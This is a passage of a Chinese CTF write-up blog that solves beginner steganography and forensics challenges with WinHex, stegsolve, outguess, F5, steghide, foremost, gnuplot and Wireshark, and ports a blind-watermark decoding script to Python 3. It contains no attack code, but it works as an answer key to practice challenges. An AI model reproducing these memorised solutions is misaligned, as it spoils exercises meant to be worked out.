src="https://img-blog.csdnimg.cn/20200325112443857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到了base64然后我就把base64 后面的内容全都放在在线解密网站去解密了。解出来一堆乱码，，，我看到这些乱码，好像是在winhex里打开的样子，所以我就又打开winhex（看的方便点）但是找半天，发现，没有隐藏压缩包、图片什么的，烦，，，，这个到底考的什么？？？有一句话说的真没错，把人逼急了，什么都做的出来，我就全选复制，整个扔浏览器里跑了。结果wc了，整出来个二维码，激动，，差点鼠标都给扔了。<br>颤抖的手掏出我的诺基亚一扫，哎，美滋滋。<br><img src="https://img-blog.csdnimg.cn/20200325114540543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="小姐姐—y1ng"><a href="#小姐姐—y1ng" class="headerlink" title="小姐姐—y1ng"></a><h3 id="13">小姐姐—y1ng</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200403190217520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这是之前比赛的题，然而我根本就没看，（我菜我有理╭(╯^╰)╮）<br><img src="https://img-blog.csdnimg.cn/20200403192432948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个看着有点别扭，但是我做的时候没想到什么思路，就还是分离一下看看能不能找到其他的信息，但是并没有，然后就放winhex里找信息了。找半天也没找到，我懵了，，，，找wp，结果发现，直接搜就行了。但是我的问题又来了，（wp上说的是直接搜BJD）<br><img src="https://img-blog.csdnimg.cn/20200403193253585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>为什么没有？我当时可迷！！！<br>然后我尝试搜了十六进制的424A44(BJD)就找到了。但是我又在下图的位置再次尝试了搜BJD，但是，但是<code>******</code>还是没有。奇怪。<br><img src="https://img-blog.csdnimg.cn/20200403193148918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="看图片属性"><a href="#看图片属性" class="headerlink" title="看图片属性"></a><h3 id="14">看图片属性</h3></h3><p>右键找到属性，看详细信息，备注就是信息</p><h3 id="SL藏在字节中"><a href="#SL藏在字节中" class="headerlink" title="SL藏在字节中"></a><h3 id="15">SL藏在字节中</h3></h3><p>winhex打开图片搜文本SL，flag就在中间的位置。（多搜几次）</p><h3 id="修改图片宽或高"><a href="#修改图片宽或高" class="headerlink" title="修改图片宽或高"></a><h3 id="16">修改图片宽或高</h3></h3><p>拖进winhex中，在改高度的地方将高度改高一点<br><img src="https://img-blog.csdnimg.cn/2020040508050654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="补充头部"><a href="#补充头部" class="headerlink" title="补充头部"></a><h3 id="17">补充头部</h3></h3><p>还是将图片在winhex打开，提示的这么明显了，是png格式，在头部位置右键单击，然后选编辑，粘贴0字节<br><img src="https://img-blog.csdnimg.cn/202004050759156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>粘贴4个，然后png格式添加<code>89504E47</code><br><img src="https://img-blog.csdnimg.cn/20200405080209679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>其他格式<br><img src="https://img-blog.csdnimg.cn/20200405081911268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>解题姿势是不变的</p><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a><h3 id="18">LSB</h3></h3><p>stegsolve打开进行转换看到在0的有效位跟其他的有点不同的是多了最上面的一串乱七八糟的东西，其他（green,blue）的都有（而且提示也是最低有效位）<br><img src="https://img-blog.csdnimg.cn/20200405082345463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后提取出来就行<br><img src="https://img-blog.csdnimg.cn/2020040508275610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="使用outguess工具"><a href="#使用outguess工具" class="headerlink" title="使用outguess工具"></a><h3 id="19">使用outguess工具</h3></h3><p>之前见了一个这样的题，那个题目特别注重了“猜”这个字。那个就是outguess。<br>看这个，一张图片<br><img src="https://img-blog.csdnimg.cn/20200405083250130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>首先想到，outguess是要有密码的，不能盲目的一顿乱操作。<br>就一张图片，分离不出任何信息，然后想到了备注<br><img src="https://img-blog.csdnimg.cn/2020040508344258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>新佛曰。新与佛论禅在线网站可解<a href="http://hi.pcmoe.net/buddha.html">新约佛论禅</a>解出来是<code>lemon</code><br>kali解题<br>payload<br><code>outguess -k &#39;密钥&#39; -r 图片 flag.txt</code>解密的<br><code>outguess -k &quot;secret key&quot; -d flag.txt 0.jpg 1.jpg</code>加密的<br>加密之后，0.jpg会覆盖1.jpg,<br>flag.txt中的内容是要隐藏的文本<br><img src="https://img-blog.csdnimg.cn/20200405084558950.png" alt="Augenstern" loading="lazy"><br>在outguess的文件夹里找到<code>flag.txt</code><br><img src="https://img-blog.csdnimg.cn/20200405084726252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="使用F5-steganography工具"><a href="#使用F5-steganography工具" class="headerlink" title="使用F5-steganography工具"></a><h3 id="20">使用F5-steganography工具</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200405085529970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>F5隐写同样是需要一个密钥，就一张图片，那就在这里下功夫。先分离，发现没东西，再看备注（虽然知道是无用还是试试）。最后才发现它就在最显眼的地方。<img src="https://img-blog.csdnimg.cn/20200405085831493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>payload<br><code>java Extract picture.jpg -p key</code><br><img src="https://img-blog.csdnimg.cn/20200405090417678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>在f5的文件目录中找到output.txt就是flag。</p><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a><h3 id="21">签到题</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200405091200160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>winhex打开图片，没给其他信息的话，一般不难找，头部没有，到最尾部看。<img src="https://img-blog.csdnimg.cn/20200405091319823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>是HTML编码，在线网站解码就行了。</p><h3 id="文件分离"><a href="#文件分离" class="headerlink" title="文件分离"></a><h3 id="22">文件分离</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200405091459994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>foremost分离<br><img src="https://img-blog.csdnimg.cn/20200405091605300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>flag拿到（个人感觉windows上使用foremost比binwalk方便多了。）</p><h3 id="画图"><a href="#画图" class="headerlink" title="画图"></a><h3 id="23">画图</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200405091812315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>下载好gnuplot后，然后开始看图片。还是第一步分离了一下。没想到还真有东西，然后看压缩包，解压出来一个txt文本。特别长。<br><img src="https://img-blog.csdnimg.cn/20200405092212849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>没头绪，不过应该没有加密了。就去看看gnuplot怎么用的吧。看学长提示的那个博客看过去，看过后，还阔以，明白了。<br>先下载个Notepad++再说，<br><img src="https://img-blog.csdnimg.cn/20200405092625107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>转换后<br><img src="https://img-blog.csdnimg.cn/20200405092711767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>保存，打开gnuplot程序<br><img src="https://img-blog.csdnimg.cn/2020040509291025.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>回车画图<br><img src="https://img-blog.csdnimg.cn/20200405092927996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>微信扫吧，别用QQ，害，明明是一个“妈”生的，差距怎么就这么大</p><h3 id="使用steghide工具"><a href="#使用steghide工具" class="headerlink" title="使用steghide工具"></a><h3 id="24">使用steghide工具</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200405093213829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>因为steghide解题也是要密钥的，所以先找图片的信息。分离，没有。下一个，看备注。这个找到了<br><img src="https://img-blog.csdnimg.cn/2020040509361965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>先在题中给的链接中学习一下怎么使用，<a href="http://www.safe6.cn/article/102">使用方法</a>，然后就可以解题了。<br><img src="https://img-blog.csdnimg.cn/20200405094830682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看着明显不是flag，像是栅栏密码，在线网站解一下<br><img src="https://img-blog.csdnimg.cn/20200405095019263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>get</p><h3 id="双图"><a href="#双图" class="headerlink" title="双图"></a><h3 id="25">双图</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200405095114233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>一顿操作猛如虎，一看码子扫不出来，<br><img src="https://img-blog.csdnimg.cn/20200405095358153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>保存这个二维码，（其实我还去搜了彩色的二维码能不能识别，sha子行为），然后再用stegsolve打开这张码子，<br><img src="https://img-blog.csdnimg.cn/20200405095835102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我把三张图一块截了，第一张是DES<br>第二张是6XaMMbM7<br>第三张是长字符串。搜一下了解到有DES加密这个密码。而且有在线解密网站，直接搜就好了，第二个是密钥。第三个是密文<br>在线解密可得出flag</p><h3 id="拼图"><a href="#拼图" class="headerlink" title="拼图"></a><h3 id="26">拼图</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200405101557773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>有两种方法，一种比较暴力，一种比较正规。<br>用到题中提示的工具，真是不得不说，下载安装真的烦，到现在我仍然是报错。烦死了，不装了，其实我已经装这个工具两天了，一个接一个的，浪费我时间艹。<br>可以直接拼出来，就直接拼吧，不会也就没办法了，工具用不了都是白搭，烦，快照都用了，还要重新下载以前下载的工具，真是烦，工具没捡到还丢了原本的工具，重装烦，。郁闷。<img src="https://img-blog.csdnimg.cn/20200405234958237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>就这吧，以后不随便往kali安装第三方工具了，</p><h3 id="流量包签到"><a href="#流量包签到" class="headerlink" title="流量包签到"></a><h3 id="27">流量包签到</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200405235238117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开这个工具，在工具中打开下载的文件，<br>然后随便点条数据，找到Source，右键单击选择追踪流，再选择TCP。就能看到flag了。<br><img src="https://img-blog.csdnimg.cn/20200406001501860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>还有一个得到flag的办法，我第一次得到flag是用这个办法的，不过可能就这道题可以用吧。<br>歪门邪道：<br>直接将文件拖进winhex，搜索文本SL 或者flag（挨个试试呗)，结果还真找到了。就这样，没了。对了，要是想不到搜flag还是什么关键字的话，直接搜<code>&#123;</code>英文输出的大括号。也可以，多向下搜几次（试过了，可以）。<br><img src="https://img-blog.csdnimg.cn/20200406002708743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>就这吧，最后几道题写的而过于简单，两天卡在一个地方，没心情写了，就这样吧。真累。</p><h3 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a><h3 id="28">盲水印</h3></h3><p>补充一道题<br>最后做出来的，同样是需要工具</p><p><img src="https://img-blog.csdnimg.cn/20200406170918966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这道题工具给出，但是同样是在前两天没有get到工具，为什么是补充的呢？就是原本不打算继续这道题了，就没有再进行下去了。现在最后几个小时了，觉得还是有些不服气，为什么我做不出来，就又接着看，继续搞那个工具了。还是跟昨天一样的报错。（为了写博客，我又将我改好的设置改回原来在github上下载的原脚本。）</p><p><img src="https://img-blog.csdnimg.cn/20200406171741720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>想到之前请教学长那个rsa的脚本的问题，就是关于python2和python3 中的除法的问题。跟这里很相似。<br>我就尝试了下自己改下脚本，原来的脚本是这样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line">ALPHA = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_parser</span>():</span></span><br><span class="line">    parser = ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--original&#x27;</span>, dest=<span class="string">&#x27;ori&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--image&#x27;</span>, dest=<span class="string">&#x27;img&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--result&#x27;</span>, dest=<span class="string">&#x27;res&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--alpha&#x27;</span>, dest=<span class="string">&#x27;alpha&#x27;</span>, default=ALPHA)</span><br><span class="line">    <span class="keyword">return</span> parser</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = build_parser()</span><br><span class="line">    options = parser.parse_args()</span><br><span class="line">    ori = options.ori</span><br><span class="line">    img = options.img</span><br><span class="line">    res = options.res</span><br><span class="line">    alpha = float(options.alpha)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(ori):</span><br><span class="line">        parser.error(<span class="string">&quot;original image %s does not exist.&quot;</span> % ori)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(img):</span><br><span class="line">        parser.error(<span class="string">&quot;image %s does not exist.&quot;</span> % img)</span><br><span class="line">    decode(ori, img, res, alpha)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">ori_path, img_path, res_path, alpha</span>):</span></span><br><span class="line">    ori = cv2.imread(ori_path)</span><br><span class="line">    img = cv2.imread(img_path)</span><br><span class="line">    ori_f = np.fft.fft2(ori)</span><br><span class="line">    img_f = np.fft.fft2(img)</span><br><span class="line">    height, width = ori.shape[<span class="number">0</span>], ori.shape[<span class="number">1</span>]</span><br><span class="line">    watermark = (ori_f - img_f) / alpha</span><br><span class="line">    watermark = np.real(watermark)</span><br><span class="line">    res = np.zeros(watermark.shape)</span><br><span class="line">    random.seed(height + width)</span><br><span class="line">    x = range(height / <span class="number">2</span>)</span><br><span class="line">    y = range(width)</span><br><span class="line">    random.shuffle(x)</span><br><span class="line">    random.shuffle(y)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(height / <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(width):</span><br><span class="line">            res[x[i]][y[j]] = watermark[i][j]</span><br><span class="line">    cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), <span class="number">100</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是原封不动的从github上下载下来的。<br><img src="https://img-blog.csdnimg.cn/20200406172155423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这两处的<code>/</code>改成<code>//</code>，然后保存，继续运行命令跑起来<br><img src="https://img-blog.csdnimg.cn/2020040617290130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以看到还是报错了，但是刚做的改动可不是无用功，可以看出来比起上面的报错，没有了那个关于<code>/</code>的报错了，所以这一步是有用的。<br>再接着看错误。这个错误不懂，有道翻译一下（英语不好）<br>有点难懂，直接百度搜报错吧，挑挑选选找到了原因。<br><strong>原因：是python3中range不返回数组对象，而是返回range对象<br>加个声明为list的语句就行</strong><br>找到range的对象加上list让它返回列表<br><img src="https://img-blog.csdnimg.cn/20200406173702992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>将这里改成图中的样子就行。保存一下再跑<br><img src="https://img-blog.csdnimg.cn/2020040617382173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>已经没有报错了，这就是全部解决了。心情舒畅了许多。<br>最后再附上完整的正确脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line">ALPHA = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_parser</span>():</span></span><br><span class="line">    parser = ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--original&#x27;</span>, dest=<span class="string">&#x27;ori&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--image&#x27;</span>, dest=<span class="string">&#x27;img&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--result&#x27;</span>, dest=<span class="string">&#x27;res&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--alpha&#x27;</span>, dest=<span class="string">&#x27;alpha&#x27;</span>, default=ALPHA)</span><br><span class="line">    <span class="keyword">return</span> parser</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = build_parser()</span><br><span class="line">    options = parser.parse_args()</span><br><span class="line">    ori = options.ori</span><br><span class="line">    img = options.img</span><br><span class="line">    res = options.res</span><br><span class="line">    alpha = float(options.alpha)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(ori):</span><br><span class="line">        parser.error(<span class="string">&quot;original image %s does not exist.&quot;</span> % ori)</span><br><span class="line">    <span 